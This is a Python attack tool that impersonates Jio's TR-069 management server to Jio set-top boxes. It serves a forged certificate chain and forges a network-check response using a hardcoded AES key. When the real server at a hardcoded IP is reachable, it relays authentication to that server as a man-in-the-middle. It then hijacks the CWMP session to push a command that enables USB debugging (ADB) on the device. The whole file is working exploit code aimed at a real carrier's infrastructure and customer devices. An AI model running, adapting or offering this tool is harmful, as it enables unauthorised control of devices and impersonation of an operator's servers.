import ssl
import socket
import threading
import datetime
import os
import re
import base64
import uuid
import hashlib
import http.client
import traceback
import sys

# ==============================================================================
# JIO STB STANDALONE MOCK ACS SERVER (DUAL-VARIANT: RELAY + OFFLINE STANDALONE)
# ==============================================================================

# --- Netcheck Bypass ---
try:
    from Crypto.Cipher import AES
    _HAVE_AES = True
except Exception:
    _HAVE_AES = False

NETCHECK_KEY = b"6bm2I7pTdBaeABX0"
NETTYPE = "FTTH"
_PRECOMPUTED_NETCHECK = "UzLgdFHvJkBfRQiHnNQit+55dub3o1PbxIhuNZ7oJc8="

def _forge_netcheck():
    if not _HAVE_AES: return _PRECOMPUTED_NETCHECK
    iv = os.urandom(16)
    data = NETTYPE.encode()
    pl = 16 - (len(data) % 16)
    data += bytes([pl]) * pl
    ct = AES.new(NETCHECK_KEY, AES.MODE_CBC, iv).encrypt(data)
    return base64.b64encode(iv + ct).decode()

# --- CWMP Payloads ---
INFORM_RESPONSE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<soap-env:Envelope xmlns:soap-enc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<soap-env:Header><cwmp:ID soap-env:mustUnderstand="1">{ID}</cwmp:ID></soap-env:Header>
<soap-env:Body><cwmp:InformResponse><MaxEnvelopes>1</MaxEnvelopes></cwmp:InformResponse></soap-env:Body>
</soap-env:Envelope>"""

SET_PARAMS_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<soap-env:Envelope xmlns:soap-enc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<soap-env:Header><cwmp:ID soap-env:mustUnderstand="1">{ID}</cwmp:ID></soap-env:Header>
<soap-env:Body><cwmp:SetParameterValues>
<ParameterList soap-enc:arrayType="cwmp:ParameterValueStruct[1]">
<ParameterValueStruct><Name>Device.JioSTB.USB.USBDebugging</Name><Value xsi:type="xsd:boolean">true</Value></ParameterValueStruct>
</ParameterList>
<ParameterKey></ParameterKey>
</cwmp:SetParameterValues></soap-env:Body>
</soap-env:Envelope>"""

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CERT_FILE = os.path.join(BASE_DIR, "forged_chain.pem")
PORTS = [7443, 8443, 9443]
BIND_ADDR = "0.0.0.0"

LOG_FILE = os.path.join(BASE_DIR, "mock_acs.log")
PACKET_LOG_FILE = os.path.join(BASE_DIR, "mock_acs_packets.log")

# Exact Real Jio ACS Digest Parameters:
REALM = "CPEDigestLogin"
OPAQUE = "145074cc9f9b8670f412d297d1d11274"  # MD5("CPEDigestLogin")

# Upstream details for Relay Mode
REAL_ACS_HOST = "acs.oss.jio.com"
REAL_ACS_PORT = 8443
REAL_ACS_IP = "49.40.134.113"

UPSTREAM_ONLINE = False
upstream_ctx = ssl._create_unverified_context()
try: upstream_ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
except Exception: pass

SESSIONS = {}
SESSIONS_LOCK = threading.Lock()
loglock = threading.Lock()

def log(m):
    """High-level operational logging for terminal and mock_acs.log."""
    with loglock:
        try:
            line = f"[{datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {m}"
            print(line, flush=True)
            with open(LOG_FILE, "a", encoding="utf-8") as lf:
                lf.write(line + "\n")
        except Exception:
            pass

def log_packet(direction, cid, line, headers, body=None, note=""):
    """
    Comprehensive network packet analyzer logging.
    Dumps full HTTP request/response headers and XML/JSON payload in plaintext.
    """
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    entry = [
        "=" * 80,
        f"[{ts}] [{direction}] Client: {cid}{f'  ({note})' if note else ''}",
        line,
        "-" * 40,
        "Headers:"
    ]
    if isinstance(headers, dict):
        for k, v in headers.items():
            entry.append(f"  {k}: {v}")
    elif isinstance(headers, list):
        for k, v in headers:
            entry.append(f"  {k}: {v}")
    
    if body:
        entry.append("-" * 40)
        entry.append(f"Payload ({len(body)} bytes):")
        try:
            if isinstance(body, bytes):
                body_txt = body.decode("utf-8", errors="replace")
            else:
                body_txt = str(body)
            entry.append(body_txt)
        except Exception:
            entry.append(f"<binary data {len(body)} bytes>")
    else:
        entry.append("-" * 40)
        entry.append("Payload: <empty body>")
    entry.append("=" * 80 + "\n")
    
    log_text = "\n".join(entry)
    with loglock:
        try:
            with open(PACKET_LOG_FILE, "a", encoding="utf-8") as pf:
                pf.write(log_text)
        except Exception:
            pass

def test_upstream_connectivity(timeout=2.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((REAL_ACS_IP, REAL_ACS_PORT))
        s.close()
        return True
    except Exception:
        return False

def forward_to_real_acs(method, path, headers, body, timeout=4.0):
    forward_headers = {k: v for k, v in headers.items() if k not in ("host", "connection", "content-length")}
    forward_headers["host"] = REAL_ACS_HOST
    forward_headers["content-length"] = str(len(body))
    forward_headers["connection"] = "keep-alive"
    
    conn = http.client.HTTPSConnection(REAL_ACS_IP, REAL_ACS_PORT, context=upstream_ctx, timeout=timeout)
    conn.request(method, path, body=body, headers=forward_headers)
    resp = conn.getresponse()
    resp_body = resp.read()
    return resp.status, resp.reason, resp.getheaders(), resp_body

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(CERT_FILE)
try: ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
except Exception: pass

def parse_cookie(headers):
    cookie_header = headers.get("cookie", "")
    if not cookie_header: return None
    m = re.search(r'(?:JSESSIONID|session)=([0-9a-zA-Z._-]+)', cookie_header)
    return m.group(1) if m else None

def extract_auth_params(auth_str):
    params = {}
    if not auth_str: return params
    for m in re.finditer(r'(\w+)=(?:"([^"]+)"|([^\s,]+))', auth_str):
        k = m.group(1).lower()
        v = m.group(2) if m.group(2) is not None else m.group(3)
        params[k] = v
    return params

def extract_device_info(body_str):
    info = {}
    patterns = {
        "Manufacturer": r'<Manufacturer[^>]*>([^<]+)</Manufacturer>',
        "ProductClass": r'<(?:ProductClass|ModelName)[^>]*>([^<]+)</(?:ProductClass|ModelName)>',
        "SerialNumber": r'<SerialNumber[^>]*>([^<]+)</SerialNumber>',
        "HardwareVersion": r'<HardwareVersion[^>]*>([^<]+)</HardwareVersion>',
        "SoftwareVersion": r'<SoftwareVersion[^>]*>([^<]+)</SoftwareVersion>',
    }
    for k, p in patterns.items():
        m = re.search(p, body_str)
        if m: info[k] = m.group(1).strip()
    return info

def get_http_date():
    return datetime.datetime.now(datetime.timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")

def read_http(rf):
    try:
        line = rf.readline()
        if not line: return None
        reqline = line.decode("latin1").rstrip("\r\n")
        headers = {}
        while True:
            h = rf.readline()
            if not h or h in (b"\r\n", b"\n"): break
            k, _, v = h.decode("latin1").partition(":")
            headers[k.strip().lower()] = v.strip()
        body = b""
        if "content-length" in headers:
            n = int(headers["content-length"])
            body = rf.read(n) if n else b""
        return reqline, headers, body
    except Exception:
        return None

def handle(conn, addr):
    cid = f"{addr[0]}:{addr[1]}"
    log(f"TCP connect from {cid}")
    try:
        s = ctx.wrap_socket(conn, server_side=True)
        log(f"TLS ok {cid}")
    except Exception as e:
        log(f"TLS fail {cid}: {type(e).__name__}: {e}")
        try: conn.close()
        except: pass
        return

    rf = s.makefile("rb")
    conn_sess = None
    has_challenged = False
    try:
        while True:
            req = read_http(rf)
            if req is None:
                log(f"{cid} closed by peer")
                break
            
            reqline, headers, body = req
            path = reqline.split(" ")[1] if len(reqline.split(" ")) > 1 else ""
            body_str = body.decode('utf-8', errors='ignore')
            cookie = parse_cookie(headers)
            has_auth = "authorization" in headers
            
            log_packet("INCOMING", cid, reqline, headers, body, note="CWMP Request from STB")
            log(f"{cid} >>> {reqline} clen={len(body)} cookie={cookie or 'NONE'}{' [AUTH]' if has_auth else ''}")
            
            # ---- NETWORK CHECK BYPASS ----
            if "network/check" in path:
                nb = ('{"Network":"%s"}' % _forge_netcheck()).encode()
                date_hdr = get_http_date().encode()
                resp_headers = {
                    "Server": "nginx/1.30.1",
                    "Date": date_hdr.decode(),
                    "Content-Type": "application/json",
                    "Content-Length": str(len(nb)),
                    "Connection": "keep-alive"
                }
                resp = (
                    b"HTTP/1.1 200 OK\r\n"
                    b"Server: nginx/1.30.1\r\n"
                    b"Date: " + date_hdr + b"\r\n"
                    b"Content-Type: application/json\r\n"
                    b"Content-Length: " + str(len(nb)).encode() + b"\r\n"
                    b"Connection: keep-alive\r\n\r\n" + nb
                )
                s.sendall(resp)
                log(f"{cid} <<< netcheck bypass")
                log_packet("OUTGOING", cid, "HTTP/1.1 200 OK", resp_headers, nb, note="Network Check Bypass Response")
                continue
            
            # ---- HTTP DIGEST AUTH CHALLENGE ----
            is_bluebank = any(b in body_str.lower() for b in ["bluebank", "jhsd", "jhsc", "jhsb", "iwedia"])
            
            if not has_auth and not has_challenged and is_bluebank and ("cwmp:Inform" in body_str or len(body) > 0):
                has_challenged = True
                relayed_401 = False
                
                # VARIANT 1: Relay from Real Jio ACS if online
                if UPSTREAM_ONLINE:
                    try:
                        log(f"{cid} [RELAY] Forwarding Inform to Real Jio ACS for genuine 401 challenge...")
                        status, reason, resp_headers_list, resp_body = forward_to_real_acs("POST", path, headers, body)
                        if status == 401:
                            out = [f"HTTP/1.1 {status} {reason}"]
                            for k, v in resp_headers_list:
                                if k.lower() in ("transfer-encoding", "connection"): continue
                                out.append(f"{k}: {v}")
                            out.append(f"Content-Length: {len(resp_body)}")
                            out.append("Connection: keep-alive")
                            challenge_resp = ("\r\n".join(out) + "\r\n\r\n").encode("latin1") + resp_body
                            s.sendall(challenge_resp)
                            log(f"{cid} <<< [RELAY] Relayed authentic 401 Digest Challenge from Real Jio ACS")
                            log_packet("OUTGOING", cid, f"HTTP/1.1 {status} {reason}", dict(resp_headers_list), resp_body, note="Relayed 401 Challenge from Real ACS")
                            relayed_401 = True
                            continue
                    except Exception as e:
                        log(f"{cid} [WARN] Upstream relay failed ({e}), falling back to local 401 challenge")
                
                # VARIANT 2: Offline Standalone Fallback with verified MD5 hash
                if not relayed_401:
                    nonce = str(uuid.uuid4())
                    jsession = uuid.uuid4().hex + ".nvmbdprv126605"
                    body_401 = b"<html><head><title>Error</title></head><body>Unauthorized</body></html>"
                    date_hdr = get_http_date().encode()
                    resp_headers = {
                        "Server": "nginx/1.30.1",
                        "Date": date_hdr.decode(),
                        "Content-Type": "text/html;charset=UTF-8",
                        "Content-Length": str(len(body_401)),
                        "Connection": "keep-alive",
                        "WWW-Authenticate": f'Digest realm="{REALM}", qop="auth", nonce="{nonce}", opaque="{OPAQUE}"',
                        "X-Powered-By": "Undertow/3",
                        "Set-Cookie": f"JSESSIONID={jsession}; path=/"
                    }
                    challenge_resp = (
                        b"HTTP/1.1 401 Unauthorized\r\n"
                        b"Server: nginx/1.30.1\r\n"
                        b"Date: " + date_hdr + b"\r\n"
                        b"Content-Type: text/html;charset=UTF-8\r\n"
                        b"Content-Length: " + str(len(body_401)).encode() + b"\r\n"
                        b"Connection: keep-alive\r\n"
                        b'WWW-Authenticate: Digest realm="' + REALM.encode() + b'", qop="auth", nonce="' + nonce.encode() + b'", opaque="' + OPAQUE.encode() + b'"\r\n'
                        b"X-Powered-By: Undertow/3\r\n"
                        b"Set-Cookie: JSESSIONID=" + jsession.encode() + b"; path=/\r\n\r\n"
                        + body_401
                    )
                    s.sendall(challenge_resp)
                    log(f"{cid} <<< [OFFLINE] 401 Digest Challenge (realm={REALM}, nonce={nonce[:8]}..., opaque={OPAQUE[:8]}...)")
                    log_packet("OUTGOING", cid, "HTTP/1.1 401 Unauthorized", resp_headers, body_401, note="Local Standalone 401 Challenge (Fallback)")
                    continue

            # ---- CWMP: INFORM ----
            if "cwmp:Inform" in body_str:
                m = re.search(r'<cwmp:ID[^>]*>([^<]+)</cwmp:ID>', body_str)
                req_id = m.group(1).strip() if m else "0"
                
                dev_meta = extract_device_info(body_str)
                dev_desc = " ".join([f"{k}={v}" for k, v in dev_meta.items() if v]) or "Unknown"
                log(f"{cid} [INFORM] Device Info: {dev_desc}")
                
                if has_auth:
                    auth_params = extract_auth_params(headers.get("authorization", ""))
                    user_str = auth_params.get("username", "unknown")
                    uri_str = auth_params.get("uri", "")
                    nc_str = auth_params.get("nc", "")
                    log(f"{cid} [AUTH] Client authenticated via HTTP Digest: username='{user_str}', uri='{uri_str}', nc={nc_str}")

                session_id = uuid.uuid4().hex
                jsession_cookie = session_id + ".nvmbdprv126605"
                conn_sess = {"state": "inform_sent"}
                with SESSIONS_LOCK:
                    SESSIONS[jsession_cookie] = conn_sess
                    SESSIONS[session_id] = conn_sess
                    if cookie:
                        SESSIONS[cookie] = conn_sess
                
                relayed_inform = False
                # VARIANT 1: Relay authenticated Inform to Real Jio ACS
                if UPSTREAM_ONLINE and has_auth:
                    try:
                        log(f"{cid} [RELAY] Forwarding authenticated Inform to Real Jio ACS...")
                        status, reason, resp_headers_list, resp_body = forward_to_real_acs("POST", path, headers, body)
                        if status == 200:
                            out = [f"HTTP/1.1 {status} {reason}"]
                            for k, v in resp_headers_list:
                                if k.lower() in ("transfer-encoding", "connection"): continue
                                out.append(f"{k}: {v}")
                            out.append(f"Content-Length: {len(resp_body)}")
                            out.append("Connection: keep-alive")
                            s.sendall(("\r\n".join(out) + "\r\n\r\n").encode("latin1") + resp_body)
                            log(f"{cid} <<< [RELAY] Relayed authentic 200 OK InformResponse from Real Jio ACS")
                            log_packet("OUTGOING", cid, f"HTTP/1.1 {status} {reason}", dict(resp_headers_list), resp_body, note="Relayed InformResponse from Real ACS")
                            relayed_inform = True
                            continue
                    except Exception as e:
                        log(f"{cid} [WARN] Upstream Inform relay failed ({e}), using local InformResponse fallback")
                
                # VARIANT 2: Offline Standalone InformResponse
                if not relayed_inform:
                    resp_xml = INFORM_RESPONSE_TEMPLATE.format(ID=req_id).encode("utf-8")
                    date_hdr = get_http_date().encode()
                    resp_headers = {
                        "Server": "nginx/1.30.1",
                        "Date": date_hdr.decode(),
                        "Content-Type": "text/xml; charset=utf-8",
                        "Content-Length": str(len(resp_xml)),
                        "Set-Cookie": f"JSESSIONID={jsession_cookie}; path=/",
                        "Connection": "keep-alive"
                    }
                    http_resp = (
                        b"HTTP/1.1 200 OK\r\n"
                        b"Server: nginx/1.30.1\r\n"
                        b"Date: " + date_hdr + b"\r\n"
                        b"Content-Type: text/xml; charset=utf-8\r\n"
                        b"Content-Length: " + str(len(resp_xml)).encode() + b"\r\n"
                        b"Set-Cookie: JSESSIONID=" + jsession_cookie.encode() + b"; path=/\r\n"
                        b"Connection: keep-alive\r\n\r\n" + resp_xml
                    )
                    s.sendall(http_resp)
                    log(f"{cid} <<< [OFFLINE] InformResponse [cookie={jsession_cookie[:16]}...]")
                    log_packet("OUTGOING", cid, "HTTP/1.1 200 OK", resp_headers, resp_xml, note="Local Standalone InformResponse")
                    continue
            
            # ---- CWMP: STATE MACHINE & SESSION HIJACK ----
            sess = SESSIONS.get(cookie) if cookie else conn_sess
            if sess:
                if sess["state"] == "inform_sent":
                    log(f"{cid} [HIJACK POINT] STB ready for commands -> Injecting local SetParameterValues (USBDebugging=true)")
                    cmd_id = "1" + uuid.uuid4().hex[:15]
                    resp_xml = SET_PARAMS_TEMPLATE.format(ID=cmd_id).encode("utf-8")
                    sess["state"] = "params_sent"
                    date_hdr = get_http_date().encode()
                    resp_headers = {
                        "Server": "nginx/1.30.1",
                        "Date": date_hdr.decode(),
                        "Content-Type": "text/xml; charset=utf-8",
                        "Content-Length": str(len(resp_xml)),
                        "Connection": "keep-alive"
                    }
                    http_resp = (
                        b"HTTP/1.1 200 OK\r\n"
                        b"Server: nginx/1.30.1\r\n"
                        b"Date: " + date_hdr + b"\r\n"
                        b"Content-Type: text/xml; charset=utf-8\r\n"
                        b"Content-Length: " + str(len(resp_xml)).encode() + b"\r\n"
                        b"Connection: keep-alive\r\n\r\n" + resp_xml
                    )
                    s.sendall(http_resp)
                    log(f"{cid} <<< SetParameterValues (USBDebugging=true) id={cmd_id}")
                    log_packet("OUTGOING", cid, "HTTP/1.1 200 OK", resp_headers, resp_xml, note="CWMP SetParameterValues")
                    continue
                
                elif sess["state"] == "params_sent":
                    if "SetParameterValuesResponse" in body_str:
                        log(f"{cid} *** SUCCESS! STB ACCEPTED! ADB ENABLED! ***")
                    else:
                        log(f"{cid} *** WARN: unexpected response ***")
                    
                    date_hdr = get_http_date().encode()
                    resp_headers = {
                        "Server": "nginx/1.30.1",
                        "Date": date_hdr.decode(),
                        "Connection": "keep-alive"
                    }
                    s.sendall(
                        b"HTTP/1.1 204 No Content\r\n"
                        b"Server: nginx/1.30.1\r\n"
                        b"Date: " + date_hdr + b"\r\n"
                        b"Connection: keep-alive\r\n\r\n"
                    )
                    log(f"{cid} <<< 204 session closed (waiting for next)")
                    log_packet("OUTGOING", cid, "HTTP/1.1 204 No Content", resp_headers, None, note="CWMP Session Closed")
                    continue
            
            # ---- Unknown / Empty POST without session ----
            date_hdr = get_http_date().encode()
            resp_headers = {
                "Server": "nginx/1.30.1",
                "Date": date_hdr.decode(),
                "Connection": "keep-alive"
            }
            s.sendall(
                b"HTTP/1.1 204 No Content\r\n"
                b"Server: nginx/1.30.1\r\n"
                b"Date: " + date_hdr + b"\r\n"
                b"Connection: keep-alive\r\n\r\n"
            )
            log_packet("OUTGOING", cid, "HTTP/1.1 204 No Content", resp_headers, None, note="204 Untracked Session")
            continue

    except Exception as e:
        log(f"{cid} handle error: {type(e).__name__}: {e}")
    finally:
        try: s.close()
        except: pass

def serve_port(port):
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((BIND_ADDR, port))
        srv.listen(64)
        log(f"### listening on {BIND_ADDR}:{port} ###")
        while True:
            try:
                conn, addr = srv.accept()
                threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
            except Exception as e:
                log(f"accept error on port {port}: {e}")
    except Exception as e:
        log(f"[ERROR] Could not bind port {port}: {e}")

def main():
    global UPSTREAM_ONLINE
    try:
        log("==========================================================")
        log("  Jio STB Mock ACS Engine (Relay + Standalone Dual)       ")
        log(f"  Packet Log: {PACKET_LOG_FILE}")
        
        log("  Checking upstream connectivity to Real Jio ACS (49.40.134.113:8443)...")
        UPSTREAM_ONLINE = test_upstream_connectivity(timeout=1.5)
        if UPSTREAM_ONLINE:
            log("  [+] Mode: ONLINE RELAY with Session Hijack (Auto-Online)")
        else:
            log("  [!] Mode: OFFLINE STANDALONE Local ACS (Auto-Fallback)")
        log("==========================================================")
        
        threads = []
        for p in PORTS:
            t = threading.Thread(target=serve_port, args=(p,), daemon=True)
            t.start()
            threads.append(t)
        
        while True:
            threading.Event().wait(1.0)
            
    except KeyboardInterrupt:
        log("Mock ACS stopped by user.")
    except Exception as e:
        err_msg = f"[FATAL CRASH] {type(e).__name__}: {e}\n{traceback.format_exc()}"
        log(err_msg)
        print("\n" + err_msg)
        try:
            input("\nPress Enter to exit...")
        except Exception:
            pass

if __name__ == "__main__":
    main()
